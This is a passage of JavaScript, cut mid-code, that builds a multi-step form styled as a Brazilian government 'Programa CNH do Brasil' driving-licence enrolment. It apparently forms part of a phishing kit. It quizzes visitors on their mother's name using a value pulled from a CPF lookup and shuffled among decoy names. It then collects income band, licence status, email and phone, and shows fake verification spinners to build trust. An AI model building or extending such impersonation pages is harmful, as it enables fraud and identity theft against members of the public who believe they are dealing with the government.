        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 2rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '3';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.innerHTML = '<strong>qual é o nome da sua mãe?</strong>';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Opções de nomes - usar o nome exato da consulta CPF e normalizar
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'space-y-3 pl-4';

        const motherName = data.nome_mae || 'Nome não encontrado';
        let names = [
            'MARIA SILVA SANTOS',
            motherName.toUpperCase(),
            'ANA PAULA COSTA'
        ];
        
        // Embaralhar as opções aleatoriamente
        names = names.sort(() => Math.random() - 0.5);
        
        names.forEach((name, index) => {
            const option = document.createElement('div');
            option.className = 'flex items-center w-full p-3 rounded-md transition-all cursor-pointer bg-gray-50 hover:bg-gray-100';
            
            const label = document.createElement('label');
            label.htmlFor = `mother-option-${index}`;
            label.className = 'flex-1 cursor-pointer';
            label.textContent = name.toLowerCase();
            label.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; text-transform: capitalize;';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'mother-option';
            radio.id = `mother-option-${index}`;
            radio.value = name;
            radio.style.display = 'none';
            
            option.appendChild(radio);
            option.appendChild(label);
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.flex.items-center.w-full.p-3.rounded-md').forEach(opt => {
                    opt.style.backgroundColor = '#f9fafb';
                    opt.style.border = 'none';
                });
                option.style.backgroundColor = '#e5e7eb';
                option.style.border = '2px solid rgb(19, 81, 180)';
                radio.checked = true;
                errorMessage.style.display = 'none';
            });
            
            optionsContainer.appendChild(option);
        });

        questionContainer.appendChild(optionsContainer);

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="mother-option"]:checked');
            if (!selectedOption) {
                // Nenhuma opção selecionada - mostrar erro
                errorMessage.textContent = 'Por favor, selecione uma opção para continuar.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Estado de verificando
            confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Verificando...';
            confirmBtn.disabled = true;
            
            setTimeout(() => {
                if (selectedOption.value.toUpperCase() === motherName.toUpperCase()) {
                    // Nome correto - mostrar verificado
                    confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Verificado';
                    
                    setTimeout(() => {
                        this.showIncomeBandScreen(data);
                    }, 500);
                } else {
                    // Nome incorreto - mostrar erro
                    errorMessage.textContent = 'Dados incorretos! Por favor, verifique sua resposta.';
                    errorMessage.style.display = 'block';
                    confirmBtn.innerHTML = 'Confirmar';
                    confirmBtn.disabled = false;
                }
            }, 2000);
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        
        // Mensagem de erro (fora do card, na posição correta)
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm';
        errorMessage.style.display = 'none';
        errorMessage.textContent = 'Dados incorretos! Por favor, verifique sua resposta.';
        main.appendChild(errorMessage);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showIncomeBandScreen(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 1rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '4';
        numberCircle.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 500;';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.innerHTML = '<strong>qual é sua faixa salarial atual?</strong>';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Opções de faixa salarial - sem validação de certo/errado
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'space-y-3 pl-4';

        const incomeBands = [
            'Desempregado(a)',
            'Até R$ 2.640 (até 2 Salários Mínimos)',
            'De R$ 2.641 A R$ 6.600 (2 A 5 Salários Mínimos)',
            'De R$ 6.601 A R$ 13.200 (5 A 10 Salários Mínimos)',
            'Acima De R$ 13.200 (mais De 10 Salários Mínimos)'
        ];
        
        incomeBands.forEach((band, index) => {
            const option = document.createElement('div');
            option.className = 'flex items-center w-full p-3 rounded-md transition-all cursor-pointer bg-gray-50 hover:bg-gray-100';
            
            const label = document.createElement('label');
            label.htmlFor = `income-option-${index}`;
            label.className = 'flex-1 cursor-pointer';
            label.textContent = band.toLowerCase();
            label.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; text-transform: capitalize;';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'income-option';
            radio.id = `income-option-${index}`;
            radio.value = band;
            radio.style.display = 'none';
            
            option.appendChild(radio);
            option.appendChild(label);
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.flex.items-center.w-full.p-3.rounded-md').forEach(opt => {
                    opt.style.backgroundColor = '#f9fafb';
                    opt.style.border = 'none';
                });
                option.style.backgroundColor = '#e5e7eb';
                option.style.border = '2px solid rgb(19, 81, 180)';
                radio.checked = true;
            });
            
            optionsContainer.appendChild(option);
        });

        questionContainer.appendChild(optionsContainer);

        // Mensagem de erro (criar antes do botão que a usa)
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm';
        errorMessage.style.display = 'none';
        errorMessage.textContent = 'Por favor, selecione uma opção para continuar.';

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="income-option"]:checked');
            if (!selectedOption) {
                // Nenhuma opção selecionada - mostrar erro
                errorMessage.textContent = 'Por favor, selecione uma opção para continuar.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Esconder mensagem de erro
            errorMessage.style.display = 'none';
            
            // Estado de processando (sem verificação de certo/errado)
            confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Processando...';
            confirmBtn.disabled = true;
            
            // Armazenar faixa salarial e prosseguir
            localStorage.setItem('userIncomeBand', selectedOption.value);
            
            setTimeout(() => {
                confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Confirmado';
                
                setTimeout(() => {
                    this.showLicenseStatusScreen(data);
                }, 500);
            }, 1000);
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        main.appendChild(errorMessage);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showLicenseStatusScreen(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 1rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '5';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.innerHTML = '<strong>qual situação atual da habilitação?</strong>';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Opções de situação da habilitação - sem validação de certo/errado
        const optionsContainer = document.createElement('div');
        optionsContainer.className = 'space-y-3 pl-4';

        const licenseStatuses = [
            'nunca tive cnh',
            'já tive cnh, mas está com prazo vencido',
            'já tive cnh, mas está com suspensão',
            'tenho cnh ativa e válida',
            'tenho cnh, mas está com bloqueio'
        ];
        
        licenseStatuses.forEach((status, index) => {
            const option = document.createElement('div');
            option.className = 'flex items-center w-full p-3 rounded-md transition-all cursor-pointer bg-gray-50 hover:bg-gray-100';
            
            const label = document.createElement('label');
            label.htmlFor = `license-option-${index}`;
            label.className = 'flex-1 cursor-pointer';
            label.textContent = status;
            label.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; text-transform: capitalize;';
            
            const radio = document.createElement('input');
            radio.type = 'radio';
            radio.name = 'license-option';
            radio.id = `license-option-${index}`;
            radio.value = status;
            radio.style.display = 'none';
            
            option.appendChild(radio);
            option.appendChild(label);
            
            option.addEventListener('click', () => {
                document.querySelectorAll('.flex.items-center.w-full.p-3.rounded-md').forEach(opt => {
                    opt.style.backgroundColor = '#f9fafb';
                    opt.style.border = 'none';
                });
                option.style.backgroundColor = '#e5e7eb';
                option.style.border = '2px solid rgb(19, 81, 180)';
                radio.checked = true;
            });
            
            optionsContainer.appendChild(option);
        });

        questionContainer.appendChild(optionsContainer);

        // Mensagem de erro (criar antes do botão que a usa)
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm';
        errorMessage.style.display = 'none';
        errorMessage.textContent = 'Por favor, selecione uma opção para continuar.';

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const selectedOption = document.querySelector('input[name="license-option"]:checked');
            if (!selectedOption) {
                // Nenhuma opção selecionada - mostrar erro
                errorMessage.textContent = 'Por favor, selecione uma opção para continuar.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Esconder mensagem de erro
            errorMessage.style.display = 'none';
            
            // Estado de processando (sem verificação de certo/errado)
            confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Processando...';
            confirmBtn.disabled = true;
            
            // Armazenar situação da habilitação e prosseguir
            localStorage.setItem('userLicenseStatus', selectedOption.value);
            
            setTimeout(() => {
                confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Confirmado';
                
                setTimeout(() => {
                    this.showEmailScreen(data);
                }, 500);
            }, 1000);
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        main.appendChild(errorMessage);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showEmailScreen(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
        searchBtn.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); font-size: 16px; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        searchBtn.innerHTML = '<svg aria-hidden="true" style="background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/></svg>';
        nav.appendChild(searchBtn);
        
        this.container.appendChild(nav);
        
        // Criar container principal
        const main = document.createElement('main');
        main.id = 'main-signin';
        main.style.cssText = 'width: 100%; max-width: 800px; margin: 20px auto; min-height: 100vh; padding: 20px;';

        // Card principal que envolve todo o conteúdo
        const card = document.createElement('div');
        card.className = 'card';
        card.style.cssText = 'width: 100%; align-items: flex-start; padding: 2rem; background-color: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);';

        const title = document.createElement('h3');
        title.className = 'text-center w-full text-lg font-bold mb-6';
        title.textContent = 'Confirme seus dados para o cadastro no Programa CNH do Brasil';
        title.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 1rem; font-weight: 600;';
        card.appendChild(title);

        const content = document.createElement('div');
        content.className = 'w-full';

        const questionContainer = document.createElement('div');
        
        // Número e pergunta
        const questionHeader = document.createElement('div');
        questionHeader.className = 'flex items-center gap-3 mb-4';
        
        const numberCircle = document.createElement('div');
        numberCircle.className = 'flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium';
        numberCircle.textContent = '6';
        questionHeader.appendChild(numberCircle);
        
        const questionText = document.createElement('p');
        questionText.className = 'font-semibold text-base';
        questionText.innerHTML = '<strong>qual é o seu e-mail?</strong>';
        questionText.style.cssText = 'font-family: Rawline, system-ui, sans-serif; font-size: 0.875rem; font-weight: 600;';
        questionHeader.appendChild(questionText);
        
        questionContainer.appendChild(questionHeader);

        // Campo de email
        const emailContainer = document.createElement('div');
        emailContainer.className = 'pl-4';
        
        const emailInput = document.createElement('input');
        emailInput.type = 'email';
        emailInput.id = 'email-input';
        emailInput.placeholder = 'Digite seu e-mail';
        emailInput.style.cssText = 'width: 100%; padding: 12px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 0.875rem; font-family: Rawline, system-ui, sans-serif; outline: none; transition: border-color 0.3s;';
        
        emailInput.addEventListener('focus', () => {
            emailInput.style.borderColor = 'rgb(19, 81, 180)';
        });
        
        emailInput.addEventListener('blur', () => {
            emailInput.style.borderColor = '#e5e7eb';
        });
        
        emailContainer.appendChild(emailInput);
        questionContainer.appendChild(emailContainer);

        // Mensagem de erro (criar antes do botão que a usa)
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message mt-4 p-3 bg-red-50 border border-red-200 rounded-md text-red-700 text-sm';
        errorMessage.style.display = 'none';
        errorMessage.textContent = 'Por favor, digite um valor válido.';

        // Botão Confirmar
        const buttonContainer = document.createElement('div');
        buttonContainer.className = 'flex justify-center mt-6';
        
        const confirmBtn = document.createElement('button');
        confirmBtn.type = 'button';
        confirmBtn.className = 'button-continuar flex items-center justify-center gap-2 min-w-[160px]';
        confirmBtn.textContent = 'Confirmar';
        confirmBtn.addEventListener('click', () => {
            const email = emailInput.value.trim();
            if (!email) {
                // Campo vazio - mostrar erro
                errorMessage.textContent = 'Por favor, digite seu e-mail.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Validação básica de email
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                errorMessage.textContent = 'Por favor, digite um e-mail válido.';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Esconder mensagem de erro
            errorMessage.style.display = 'none';
            
            // Estado de processando
            confirmBtn.innerHTML = '<svg class="animate-spin" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0a8 8 0 1 0 8 8A8 8 0 0 0 8 0zM4.5 7.5a.5.5 0 0 1 .5-.5h6a.5.5 0 0 1 0 1H5a.5.5 0 0 1-.5-.5z"/></svg> Processando...';
            confirmBtn.disabled = true;
            
            // Armazenar email e prosseguir
            localStorage.setItem('userEmail', email);
            
            setTimeout(() => {
                confirmBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.75.75 0 0 1 1.02-.12z"/></svg> Confirmado';
                
                setTimeout(() => {
                    this.showPhoneScreen(data);
                }, 500);
            }, 1000);
        });
        
        buttonContainer.appendChild(confirmBtn);
        questionContainer.appendChild(buttonContainer);

        content.appendChild(questionContainer);
        card.appendChild(content);
        main.appendChild(card);
        main.appendChild(errorMessage);
        
        // Adicionar header e tela de verificação ao container
        this.container.appendChild(main);
    }

    showPhoneScreen(data) {
        // Limpar completamente o container
        this.container.innerHTML = '';
        
        // Criar header com Font Awesome
        const mainHeader = this.createHeaderWithFA();
        this.container.appendChild(mainHeader);
        
        // Criar navegação secundária
        const nav = document.createElement('nav');
        nav.style.cssText = 'background-color: white; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-width: medium medium 1px; border-style: none none solid; border-color: currentcolor currentcolor rgb(229, 229, 229); border-image: initial; box-shadow: none;';
        
        const menuContainer = document.createElement('button');
        menuContainer.style.cssText = 'border-width: medium; border-style: none; border-color: currentcolor; border-image: initial; color: rgb(20, 81, 180); display: flex; align-items: center; cursor: pointer; background: none; box-shadow: none; padding: 0px;';
        menuContainer.innerHTML = '<svg aria-hidden="true" style="margin-right: 10px; font-size: 16px; background: none; box-shadow: none;" width="16" height="16" viewBox="0 0 16 16" fill="currentColor"><path d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z"/></svg><span style="color: rgb(102, 102, 102); font-size: 1rem; font-weight: 300; line-height: 20px; padding-top: 2px; background: none; box-shadow: none;">Programa CNH do Brasil</span>';
        nav.appendChild(menuContainer);
        
        const searchBtn = document.createElement('button');
        searchBtn.setAttribute('aria-label', 'Pesquisar');
